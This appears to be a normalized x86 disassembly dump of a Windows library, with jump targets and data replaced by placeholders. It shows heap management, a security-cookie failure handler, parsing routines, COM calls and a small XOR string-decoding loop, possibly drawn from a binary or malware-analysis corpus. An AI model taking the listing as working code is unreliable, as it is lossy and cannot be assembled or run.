mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov eax 0x64
mov esp ebp
pop ebp
retn 0x4
push 0x400
push 0x8
mov [ ebp - 0x8 ] 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ edi ] eax
mov ecx [ esi ]
lea edx [ ebp - 0x8 ]
push edx
mov edx [ ebp + 0x8 ]
push 0x400
add ecx eax
mov eax [ ebx + 0xe0 ]
push ecx
push edx
call eax
test eax eax
je r-xdata
push eax
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
push esi
push ecx
push eax
mov [ edi ] eax
mov eax [ ebx + 0xe0 ]
push edx
call eax
mov ecx [ ebp - 0x4 ]
cmp ecx [ esi ]
jne r-xdata
cmp [ esi ] 0x0
jne r-xdata
lea esp [ esp ]
mov eax 0x5
mov esp ebp
pop ebp
retn 0x4
test eax eax
jne r-xdata
xor eax eax
mov esp ebp
pop ebp
retn 0x4
mov eax 0x6
mov esp ebp
pop ebp
retn 0x4
add [ esi ] eax
mov eax [ esi ]
mov ecx [ edi ]
add eax 0x400
push eax
push ecx
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapReAlloc@IAT ]
mov ecx [ ebp + 0x8 ]
lea edx [ ebp - 0x8 ]
push edx
mov [ edi ] eax
add eax [ esi ]
mov edx [ ebx + 0xe0 ]
push 0x400
push eax
push ecx
call edx
test eax eax
jne r-xdata
mov eax [ ebp - 0x8 ]
test eax eax
je r-xdata
sub_1001a709
push 0x4
mov eax sub_100854f2
call sub_10026266
mov esi ecx
mov [ ebp - 0x10 ] esi
mov eax [ ebp + 0xc ]
mov [ esi + 0x4 ] eax
push [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov [ esi ] r--data
call sub_10046fb8
mov eax esi
call sub_10008d33
retn 0x8
sub_1001a73c
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x8 ]
push edi
cmp ebx 0xffffffff
je r-xdata
and [ ebp - 0x320 ] 0x0
push 0x4c
lea eax [ ebp - 0x31c ]
push 0x0
push eax
call sub_1007f8f0
lea eax [ ebp - 0x320 ]
mov [ ebp - 0x328 ] eax
lea eax [ ebp - 0x2d0 ]
add esp 0xc
mov [ ebp - 0x324 ] eax
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x224 ] ecx
mov [ ebp - 0x228 ] edx
mov [ ebp - 0x22c ] ebx
mov [ ebp - 0x230 ] esi
mov [ ebp - 0x234 ] edi
mov [ ebp - 0x208 ] ss
mov [ ebp - 0x214 ] cs
mov [ ebp - 0x238 ] ds
mov [ ebp - 0x23c ] es
mov [ ebp - 0x240 ] fs
mov [ ebp - 0x244 ] gs
pushfd
pop [ ebp - 0x210 ]
mov eax [ ebp + 0x4 ]
lea ecx [ ebp + 0x4 ]
mov [ ebp - 0x20c ] ecx
mov [ ebp - 0x2d0 ] 0x10001
mov [ ebp - 0x218 ] eax
mov ecx [ ecx - 0x4 ]
mov [ ebp - 0x21c ] ecx
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x320 ] ecx
mov ecx [ ebp + 0x10 ]
mov [ ebp - 0x31c ] ecx
mov [ ebp - 0x314 ] eax
call [ IsDebuggerPresent@IAT ]
push 0x0
mov edi eax
call [ SetUnhandledExceptionFilter@IAT ]
lea eax [ ebp - 0x328 ]
push eax
call [ UnhandledExceptionFilter@IAT ]
test eax eax
jne r-xdata
push ebx
call sub_1006ad26
pop ecx
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_10032529
leave
retn
test edi edi
jne r-xdata
cmp ebx 0xffffffff
je r-xdata
push ebx
call sub_1006ad26
pop ecx
sub_1001a865
push 0x194
mov eax sub_10085915
call sub_10047689
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0x18 ]
and [ ebp - 0x168 ] 0x0
cmp [ ebp + 0x14 ] 0x0
mov esi [ ebp + 0xc ]
mov [ ebp - 0x188 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x18c ] ecx
mov [ ebp - 0x16c ] eax
mov [ ebp - 0x190 ] ebx
mov ecx ebx
je r-xdata
lea eax [ ebp - 0x19c ]
push eax
call sub_10007a10
push eax
mov [ ebp - 0x4 ] 0x1
call sub_100294ad
pop ecx
lea ecx [ ebp - 0x19c ]
lea eax [ ebp - 0x194 ]
push eax
call sub_10007a10
and [ ebp - 0x4 ] 0x0
push eax
call sub_100054b4
pop ecx
lea ecx [ ebp - 0x194 ]
jmp r-xdata
mov ecx [ ebp - 0x180 ]
cmp ecx 0x4
jae r-xdata
mov [ ebp - 0x174 ] eax
call sub_1002be90
and [ ebp - 0x38 ] 0x0
push 0x7
pop edi
xor eax eax
mov [ ebp - 0x161 ] 0x0
mov [ ebp - 0x16d ] 0x0
mov [ ebp - 0x34 ] edi
mov [ ebp - 0x48 ] ax
and [ ebp - 0x54 ] eax
mov [ ebp - 0x4 ] 0x2
mov [ ebp - 0x50 ] edi
mov [ ebp - 0x64 ] ax
mov ecx [ ebp - 0x174 ]
mov eax [ ecx ]
lea edx [ ebp - 0x198 ]
push edx
mov [ ebp - 0x4 ] 0x3
call [ eax + 0x24 ]
and [ ebp - 0x180 ] 0x0
jmp r-xdata
cmp [ ebp - 0x161 ] 0x0
jne r-xdata
movsx eax [ ebp + ecx - 0x198 ]
sub eax 0x20
je r-xdata
push 0xffffffff
push 0x0
lea ecx [ ebp - 0x64 ]
call sub_1005bd10
jmp r-xdata
cmp [ ebp - 0x38 ] 0x1
jbe r-xdata
cmp ecx 0x3
je r-xdata
sub eax 0x4
je r-xdata
mov ecx [ ebp - 0x188 ]
lea eax [ ebp - 0x64 ]
push eax
call sub_100542b0
push 0x0
push 0x1
lea ecx [ ebp - 0x64 ]
call sub_1006d830
push 0x0
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_1006d830
mov eax [ ebp - 0x188 ]
call sub_100262c3
retn 0x14
cmp [ ebp - 0x16d ] 0x0
je r-xdata
cmp [ ebp - 0x34 ] 0x8
mov eax [ ebp - 0x48 ]
jae r-xdata
inc [ ebp - 0x180 ]
cmp [ ebp - 0x161 ] 0x0
je r-xdata
lea eax [ ebp - 0x1a0 ]
push eax
mov ecx ebx
call sub_10007a10
push eax
mov [ ebp - 0x4 ] 0xd
call sub_1002bd30
pop ecx
lea ecx [ ebp - 0x1a0 ]
mov edi eax
mov [ ebp - 0x4 ] 0x3
call sub_1002be90
jmp r-xdata
mov ecx [ ebp - 0x174 ]
lea eax [ ebp - 0x2c ]
push eax
call sub_100332a0
test [ ebx + 0x14 ] 0x8
mov [ ebp - 0x4 ] 0x4
jne r-xdata
sub eax edi
je r-xdata
mov eax [ ebp - 0x18c ]
add eax 0x8
push eax
push 0x0
push 0x2d
call sub_10030ff0
add esp 0xc
movzx eax ax
push eax
push 0x1
push 0x0
lea ecx [ ebp - 0x64 ]
call sub_1004a101
mov edi eax
lea eax [ ebp - 0x48 ]
mov ebx [ ebp - 0x190 ]
push 0x7
pop edi
push [ ebp - 0x16c ]
mov ecx esi
call sub_1002839c
test al al
je r-xdata
cmp [ ebp - 0x180 ] 0x3
jne r-xdata
push [ ebp - 0x16c ]
mov ecx esi
call sub_1002839c
test al al
jne r-xdata
push [ ebp - 0x16c ]
mov ecx esi
call sub_1002839c
test al al
jne r-xdata
sub eax 0x4b
je r-xdata
mov ecx [ ebp - 0x38 ]
add edi 0x2
lea eax [ eax + ecx * 2 ]
cmp edi eax
je r-xdata
lea eax [ ebp - 0x48 ]
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x18 ] 0x8
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x38 ] 0x1
ja r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
mov ebx [ ebp - 0x174 ]
lea eax [ ebp - 0x128 ]
push eax
mov ecx ebx
call sub_1002f75b
or [ ebp - 0x168 ] 0x1
cmp [ eax + 0x10 ] 0x0
mov [ ebp - 0x4 ] 0x5
jbe r-xdata
mov ebx [ ebp - 0x174 ]
mov eax [ ebx ]
xor edi edi
mov ecx ebx
mov [ ebp - 0x17c ] edi
call [ eax + 0x1c ]
mov [ ebp - 0x184 ] eax
mov eax [ ebp - 0x18c ]
add eax 0x8
push eax
push edi
push 0x30
call sub_10030ff0
movzx eax ax
mov [ ebp - 0x178 ] eax
add esp 0xc
lea eax [ ebp - 0x80 ]
push eax
mov ecx ebx
call sub_10026407
mov [ ebp - 0x4 ] 0xb
cmp [ ebp - 0x70 ] edi
je r-xdata
dec eax
dec eax
jne r-xdata
cmp [ ebp - 0x34 ] 0x8
mov eax [ ebp - 0x48 ]
jae r-xdata
push [ ebp - 0x16c ]
mov ecx esi
call sub_1002839c
test al al
jne r-xdata
movzx eax [ esi + 0x6 ]
mov edx [ edi ]
push eax
push 0x48
mov ecx edi
call [ edx + 0x8 ]
test al al
je r-xdata
mov ecx esi
call sub_100255aa
mov edi eax
jmp r-xdata
lea eax [ ebp - 0x2c ]
push [ ebp - 0x16c ]
mov ecx esi
call sub_1002839c
test al al
jne r-xdata
cmp [ ebp - 0x18 ] 0x8
movzx eax [ esi + 0x6 ]
mov ecx [ ebp - 0x2c ]
jae r-xdata
mov ecx esi
call sub_100255aa
mov [ ebp - 0x16e ] 0x0
lea eax [ ebp - 0xf0 ]
push eax
mov ecx ebx
call sub_1002f75b
or [ ebp - 0x168 ] 0x2
cmp [ eax + 0x14 ] 0x8
mov [ ebp - 0x4 ] 0x6
jb r-xdata
push [ ebp - 0x16c ]
mov ecx esi
call sub_1002839c
test al al
je r-xdata
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x8 ]
movzx ebx ax
cmp bx di
je r-xdata
mov ecx [ ebp - 0x38 ]
lea eax [ eax + ecx * 2 ]
cmp edi eax
je r-xdata
lea eax [ ebp - 0x48 ]
cmp [ esi + 0x4 ] al
jne r-xdata
mov ecx esi
call sub_1000eff4
push [ ebp - 0x16c ]
mov ecx esi
call sub_1002839c
test al al
je r-xdata
push 0xffffffff
push 0x0
lea ecx [ ebp - 0x2c ]
call sub_1005bd10
cmp [ esi + 0x4 ] al
jne r-xdata
cmp ax [ ecx ]
jne r-xdata
lea ecx [ ebp - 0x2c ]
test [ ebp - 0x168 ] 0x1
mov [ ebp - 0x4 ] 0x3
je r-xdata
and [ ebp - 0x168 ] 0xfffffffd
push 0x0
push 0x1
lea ecx [ ebp - 0xf0 ]
call sub_1006d830
mov edi eax
mov edi [ eax ]
jmp r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x174 ]
mov eax [ ecx ]
call [ eax + 0x4 ]
push [ ebp - 0x16c ]
mov ecx esi
movzx edi ax
call sub_1002839c
test al al
jne r-xdata
cmp [ ebp - 0x6c ] 0x10
mov eax [ ebp - 0x80 ]
jae r-xdata
mov ax [ esi + 0x6 ]
cmp ax [ edi ]
jne r-xdata
mov ecx esi
call sub_100255aa
cmp [ ebp - 0x18 ] 0x8
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x18 ] 0x8
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x18 ] 0x8
movzx eax [ esi + 0x6 ]
mov ecx [ ebp - 0x2c ]
jae r-xdata
mov ecx esi
call sub_100255aa
cmp [ ebp - 0x16e ] 0x0
je r-xdata
and [ ebp - 0x168 ] 0xfffffffe
push 0x0
push 0x1
lea ecx [ ebp - 0x128 ]
call sub_1006d830
movzx eax [ esi + 0x6 ]
mov [ ebp - 0x16e ] 0x1
cmp [ edi ] ax
je r-xdata
mov ecx esi
call sub_100255aa
cmp [ esi + 0x4 ] 0x0
jne r-xdata
movzx eax [ esi + 0x6 ]
cmp [ ebp - 0x178 ] ax
ja r-xdata
mov ecx esi
call sub_100255aa
cmp [ ebp - 0x54 ] 0x0
jne r-xdata
test di di
je r-xdata
cmp [ eax ] 0x7f
jae r-xdata
lea eax [ ebp - 0x80 ]
mov ecx esi
call sub_1000eff4
jmp r-xdata
mov ecx [ ebp - 0x1c ]
lea eax [ eax + ecx * 2 ]
cmp edi eax
je r-xdata
lea eax [ ebp - 0x2c ]
mov ecx [ ebp - 0x1c ]
lea eax [ eax + ecx * 2 ]
cmp edi eax
je r-xdata
lea eax [ ebp - 0x2c ]
cmp ax [ ecx ]
je r-xdata
lea ecx [ ebp - 0x2c ]
lea eax [ ebp - 0xd4 ]
push eax
mov ecx ebx
call sub_1001fc54
or [ ebp - 0x168 ] 0x4
cmp [ eax + 0x10 ] 0x0
mov [ ebp - 0x4 ] 0x8
jbe r-xdata
mov ecx esi
call sub_1000eff4
lea eax [ ebp - 0x160 ]
push eax
mov ecx ebx
call sub_1002f75b
push eax
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x7
call sub_10033f90
lea ecx [ ebp - 0x160 ]
jmp r-xdata
test [ ebp - 0x168 ] 0x2
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov edi [ ebp - 0x184 ]
cmp [ ebp - 0x17c ] edi
jge r-xdata
mov [ ebp - 0x161 ] 0x1
jmp r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
xor edi edi
push edi
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x2c ] 0x0
call sub_10021130
push [ ebp - 0x16c ]
mov ecx esi
mov [ ebp - 0x4 ] 0xc
call sub_1002839c
test al al
jne r-xdata
cmp [ ebp - 0x34 ] 0x8
mov eax [ ebp - 0x48 ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x161 ] 0x1
xor bl bl
lea eax [ ebp - 0x144 ]
push eax
mov ecx ebx
call sub_1001fc54
or [ ebp - 0x168 ] 0x8
cmp [ eax + 0x14 ] 0x8
mov [ ebp - 0x4 ] 0x9
jb r-xdata
push 0x0
push 0x1
mov [ ebp - 0x4 ] 0x3
call sub_1006d830
jmp r-xdata
movzx ecx [ ebp - 0x178 ]
movzx eax [ esi + 0x6 ]
add ecx 0x9
cmp eax ecx
jg r-xdata
mov ecx esi
call sub_100255aa
push 0x0
push 0x1
lea ecx [ ebp - 0x80 ]
mov [ ebp - 0x4 ] 0x3
call sub_10005b50
jmp r-xdata
sub edi [ ebp - 0x17c ]
movzx eax [ esi + 0x6 ]
cmp ax di
jne r-xdata
mov ecx esi
call sub_100255aa
cmp [ ebp - 0x6c ] 0x10
mov edx [ ebp - 0x80 ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
movzx eax [ esi + 0x6 ]
cmp ax [ edi ]
jne r-xdata
mov ecx esi
call sub_100255aa
test [ ebp - 0x168 ] 0x4
mov [ ebp - 0x4 ] 0x3
je r-xdata
and [ ebp - 0x168 ] 0xfffffff7
push 0x0
push 0x1
lea ecx [ ebp - 0x144 ]
call sub_1006d830
mov edi eax
mov edi [ eax ]
jmp r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
push [ ebp - 0x178 ]
lea ecx [ ebp - 0x64 ]
push 0x1
call sub_10004190
dec edi
jne r-xdata
jmp r-xdata
jmp r-xdata
cmp [ ebp - 0x161 ] 0x0
jne r-xdata
lea edx [ ebp - 0x80 ]
movzx eax [ esi + 0x6 ]
cmp [ ebp - 0x178 ] ax
ja r-xdata
mov ecx esi
call sub_100255aa
mov ecx esi
add edi 0x2
call sub_1000eff4
test bl bl
je r-xdata
and [ ebp - 0x168 ] 0xfffffffb
push 0x0
push 0x1
lea ecx [ ebp - 0xd4 ]
call sub_1006d830
movzx eax [ esi + 0x6 ]
cmp [ edi ] ax
jne r-xdata
mov ecx esi
call sub_100255aa
cmp [ esi + 0x4 ] 0x0
jne r-xdata
movzx eax [ esi + 0x6 ]
push eax
push 0x1
lea ecx [ ebp - 0x64 ]
call sub_10004190
mov ecx esi
call sub_1000eff4
mov ecx esi
call sub_100255aa
mov ecx esi
call sub_1000eff4
push [ ebp - 0x16c ]
mov ecx esi
call sub_1002839c
test al al
je r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10005b50
test edi edi
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x174 ]
lea eax [ ebp - 0x10c ]
push eax
call sub_1002f75b
mov edi [ eax + 0x10 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x10c ]
call sub_1006d830
test edi edi
je r-xdata
mov ecx esi
call sub_1000eff4
mov ecx [ ebp - 0x174 ]
lea eax [ ebp - 0xb8 ]
push eax
call sub_1001fc54
push eax
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0xa
call sub_10033f90
push 0x0
push 0x1
lea ecx [ ebp - 0xb8 ]
mov [ ebp - 0x4 ] 0x3
call sub_1006d830
jmp r-xdata
mov bl 0x1
jmp r-xdata
mov eax [ ebp - 0x17c ]
cmp eax [ ebp - 0x184 ]
jge r-xdata
mov eax [ ebp - 0x184 ]
cmp [ ebp - 0x17c ] eax
jge r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0xb
call sub_10005b50
jmp r-xdata
mov cl [ edx ]
cmp cl 0x7f
je r-xdata
cmp [ eax + edi ] 0x0
je r-xdata
lea eax [ ebp - 0x2c ]
movzx ecx [ ebp - 0x178 ]
movzx eax [ esi + 0x6 ]
add ecx 0x9
cmp eax ecx
jg r-xdata
mov ecx esi
call sub_100255aa
mov ecx [ ebp - 0x174 ]
lea eax [ ebp - 0x9c ]
push eax
call sub_1001fc54
mov edi [ eax + 0x10 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x9c ]
call sub_1006d830
test edi edi
jne r-xdata
mov [ ebp - 0x16d ] 0x1
jmp r-xdata
test [ ebp - 0x168 ] 0x8
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov [ ebp - 0x161 ] 0x1
dec edi
je r-xdata
test edi edi
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
movzx eax [ esi + 0x6 ]
cmp [ ebp - 0x178 ] ax
ja r-xdata
mov ecx esi
call sub_100255aa
test edi edi
jne r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
movzx eax [ esi + 0x6 ]
cmp ax bx
jne r-xdata
mov ecx esi
call sub_100255aa
movzx eax [ esi + 0x6 ]
push eax
push 0x1
lea ecx [ ebp - 0x64 ]
call sub_10004190
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
mov ecx esi
call sub_100255aa
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ edx + 0x1 ] 0x0
jle r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp cl [ eax + edi ]
jne r-xdata
lea eax [ ebp - 0x2c ]
cmp [ eax + edi ] 0x0
jle r-xdata
lea eax [ ebp - 0x2c ]
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10042a70
inc edi
cmp [ eax + edi ] 0x7f
je r-xdata
lea eax [ ebp - 0x2c ]
movzx ecx [ ebp - 0x178 ]
movzx eax [ esi + 0x6 ]
add ecx 0x9
cmp eax ecx
jg r-xdata
mov ecx esi
call sub_100255aa
inc edx
jmp r-xdata
cmp cl [ eax ]
jl r-xdata
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x161 ] 0x1
mov [ ebp - 0x161 ] 0x1
inc edi
jmp r-xdata
mov ecx esi
call sub_1000eff4
push [ ebp - 0x16c ]
mov ecx esi
call sub_1002839c
test al al
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
inc [ eax + edi ]
jmp r-xdata
lea eax [ ebp - 0x2c ]
movzx eax [ esi + 0x6 ]
push eax
push 0x1
lea ecx [ ebp - 0x64 ]
call sub_10004190
inc [ ebp - 0x17c ]
mov ecx esi
call sub_100255aa
sub_1001b210
mov edi edi
push ebp
mov ebp esp
sub esp 0x54
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x1c ]
push ebx
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x44 ] 0x0
and [ ebp - 0x48 ] 0x0
push esi
mov esi [ ebp + 0x20 ]
push edi
mov edi [ ebp + 0x8 ]
lea edx [ ebp - 0x44 ]
push edx
lea edx [ ebp - 0x48 ]
push edx
push eax
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x40 ]
push eax
push ecx
call sub_100332b9
add esp 0x18
push eax
lea eax [ ebp - 0x4c ]
push eax
lea eax [ ebp - 0x40 ]
push eax
call sub_1001f911
fstp [ ebp - 0x54 ]
mov eax [ ebp - 0x48 ]
add esp 0x10
test eax eax
je r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1002839c
test al al
je r-xdata
fld [ ebp - 0x54 ]
shl eax 0x2
push eax
push ecx
push ecx
fstp [ esp ]
call sub_1002262f
fstp [ ebp - 0x54 ]
add esp 0xc
lea eax [ ebp - 0x40 ]
cmp [ ebp - 0x4c ] eax
je r-xdata
or [ esi ] 0x1
or [ esi ] 0x2
cmp [ ebp - 0x44 ] 0x0
jne r-xdata
fld [ ebp - 0x54 ]
fstp [ ebx ]
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x4 ]
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
mov [ edi + 0x4 ] eax
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10032529
leave
retn 0x20
sub_1001b2d2
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop ebp
retn
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
test eax eax
jne r-xdata
push esi
call sub_1005b670
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_1002f1fa
pop ecx
mov [ esi ] eax
pop esi
sub_1001b30c
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov cl [ ebp + 0x8 ]
test cl 0x1
je r-xdata
test cl 0x8
je r-xdata
fld [ rw-data ]
fistp [ ebp + 0x8 ]
fwait
test cl 0x10
je r-xdata
fwait
fnstsw ax
fld [ rw-data ]
fstp [ ebp - 0x8 ]
fwait
fwait
fnstsw ax
test cl 0x4
je r-xdata
fld [ rw-data ]
fstp [ ebp - 0x8 ]
fwait
test cl 0x20
je r-xdata
fldz
fld1
fdivrp st1
fstp st0
fwait
leave
retn
fldpi
fstp [ ebp - 0x8 ]
fwait
sub_1001b370
cmp [ esi ] 0x0
je r-xdata
retn
push ebx
mov ebx [ LocalFree@IAT ]
push edi
lea ecx [ ecx ]
mov ecx [ esi ]
push ecx
call ebx
mov [ esi ] edi
test edi edi
jne r-xdata
mov edx [ eax ]
mov ecx eax
mov eax [ edx ]
push 0x1
call eax
mov eax [ esi ]
mov edi [ eax + 0x4 ]
mov eax [ eax ]
test eax eax
je r-xdata
pop edi
pop ebx
sub_1001b3a3
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add ecx 0x9
push ecx
add eax 0x9
push eax
call sub_1007fbc0
neg eax
pop ecx
sbb eax eax
pop ecx
inc eax
pop ebp
retn 0x4
sub_1001b3c3
push 0x3c
mov eax sub_100855ee
call sub_10047689
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0x1c ]
and [ ebp - 0x24 ] 0x0
mov esi r--data
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x44 ] ecx
mov [ ebp - 0x3c ] eax
movsb [ edi ] [ esi ]
mov [ ebp - 0x20 ] 0xf
mov [ ebp - 0x34 ] 0x0
mov al [ ebp + 0x24 ]
and [ ebp - 0x4 ] 0x0
test al al
jne r-xdata
mov [ ebp - 0x16 ] al
mov al [ ebp + 0x20 ]
mov [ ebp - 0x15 ] al
mov al [ ebp + 0x20 ]
mov [ ebp - 0x16 ] al
jmp r-xdata
push eax
push ebx
lea eax [ ebp - 0x18 ]
push eax
push [ ebp - 0x24 ]
push ecx
call sub_1004ad03
mov esi eax
add esp 0x14
test esi esi
jne r-xdata
lea ecx [ ebp - 0x34 ]
mov [ ebp - 0x38 ] 0x10
and [ ebp - 0x48 ] 0x0
mov eax [ ebp - 0x34 ]
dec esi
cmp [ ebp - 0x20 ] 0x10
jae r-xdata
mov eax [ ebp - 0x38 ]
add eax eax
mov [ ebp - 0x38 ] eax
jmp r-xdata
lea ebx [ eax + 0x1 ]
test esi esi
je r-xdata
lea eax [ ebp - 0x34 ]
push 0x0
push [ ebp - 0x38 ]
lea ecx [ ebp - 0x34 ]
call sub_10042a70
cmp [ ebp - 0x20 ] 0x10
mov edi [ ebp - 0x44 ]
mov eax [ edi + 0x8 ]
mov ecx [ ebp - 0x34 ]
jae r-xdata
mov eax [ ebp + 0xc ]
mov esi [ ebp - 0x3c ]
mov [ esi ] eax
mov eax [ ebp + 0x10 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x34 ]
mov [ esi + 0x4 ] eax
call sub_10005b50
mov eax esi
call sub_100262c3
retn 0x20
add edi 0xc
xor eax eax
jle r-xdata
push edi
lea eax [ ebp - 0x48 ]
push eax
push esi
lea eax [ ebp - 0x40 ]
push ebx
push eax
call sub_10025a12
add esp 0x14
cmp eax 0xfffffffd
je r-xdata
push [ ebp - 0x40 ]
lea ecx [ ebp + 0xc ]
sub esi eax
add ebx eax
call sub_100176b0
test esi esi
jne r-xdata
test eax eax
js r-xdata
jne r-xdata
cmp [ ebp - 0x40 ] 0x0
jne r-xdata
push ebx
call sub_1007fa40
pop ecx
inc eax
jmp r-xdata
sub_1001b4dd
push 0x14
mov eax sub_10085df6
call sub_10026266
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_1000c927
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_1006ef60
mov ecx [ ebp + 0x8 ]
push eax
call sub_1005eec0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10003c9c
mov eax edi
call sub_10008d33
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10009996
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10042890
push edi
call sub_10008715
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100661c2
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10055e2a
sub_1001b580
push ebp
mov ebp esp
sub esp 0xcc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi ecx
mov ecx 0x3
mov [ ebp - 0xc8 ] eax
xor eax eax
mov [ ebp - 0x1c ] cx
mov ecx [ r--data ]
mov [ ebp - 0xc4 ] esi
mov [ ebp - 0xbc ] eax
mov [ ebp - 0xc0 ] eax
lea edx [ eax + 0x1 ]
movsx ebx [ eax + ecx ]
xor ebx eax
xor ebx 0x5f
and ebx 0xff
mov [ ebp + eax * 2 - 0x4c ] bx
inc eax
cmp eax 0x7
jb r-xdata
mov ebx [ ebp - 0x1c ]
mov ecx [ esi + 0x1c ]
xor eax eax
mov [ ebp - 0x3e ] ax
mov esi [ ecx ]
lea eax [ ebp - 0xbc ]
push eax
push r--data
lea eax [ ebp - 0x4c ]
push eax
sub esp 0x10
mov eax esp
mov [ eax ] ebx
mov ebx [ ebp - 0x18 ]
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] edx
mov edx [ ebp - 0x10 ]
mov [ eax + 0xc ] edx
mov eax [ esi + 0xe0 ]
push ecx
call eax
test eax eax
mov eax [ ebp - 0xbc ]
jns r-xdata
lea edx [ ebp - 0xac ]
xor esi esi
mov [ ebp - 0xac ] esi
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x44 ]
call eax
cmp eax esi
jge r-xdata
test eax eax
je r-xdata
mov eax [ edi ]
mov ebx [ VarBstrFromUI4@IAT ]
lea ecx [ ebp - 0xb8 ]
push ecx
push esi
push 0x80000000
push eax
mov [ ebp - 0xb8 ] esi
call ebx
cmp [ ebp - 0xb8 ] esi
jne r-xdata
lea edx [ ebp - 0x80 ]
mov eax 0xc8
jmp r-xdata
lea edx [ ebp - 0x84 ]
mov eax 0xd1
call sub_1002f620
mov eax 0x1
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0x24 ]
mov eax 0x11d
call sub_1002f620
mov ecx [ ebp - 0xc4 ]
mov esi [ ebp - 0xb8 ]
push edx
lea eax [ ebp - 0xac ]
push eax
push ecx
call sub_10007950
test eax eax
je r-xdata
push r--data
